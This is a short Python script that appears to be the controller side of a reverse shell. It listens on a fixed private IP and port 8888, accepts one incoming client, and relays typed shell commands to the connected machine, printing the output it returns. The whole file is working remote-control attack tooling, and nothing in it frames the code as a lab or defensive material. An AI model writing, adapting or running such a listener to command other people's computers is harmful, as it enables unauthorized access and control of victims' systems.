# Server
import socket,os
from colorama import Fore

os.system("cls")

# Globals
IP = "192.168.178.185"
PORT = 8888
IDENTIFIER = "<END_OF_COMMAND_RESULT>"
SIZE = "1024"

print(Fore.RED + """
       (   (     )      (   (
 (    ))\  )(   /((    ))\  )(
 )\  /((_)(()\ (_))\  /((_)(()\ 
((_)(_))   ((_)_)((_)(_))   ((_)
(_-</ -_) | '_|\ V / / -_) | '_|
/__/\___| |_|   \_/  \___| |_|
""")

servermain = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
servermain.bind((IP, PORT))
servermain.listen(1)
client, clientaddr = servermain.accept()
print(f"Got A Connection from {clientaddr}.")

while True:
    try:
        cmd = input("$")
        if cmd[0:2] == "cd":
            os.chdir(cmd[3:])
        if cmd == "exit":
            client.close()
            servermain.close()
            break
        if len(cmd) > 0:
            client.send(cmd.encode())
            client_response = str(client.recv(1024),"utf-8")
            print(client_response, end="")
    except Exception as e:
        print("Error running command: ",e)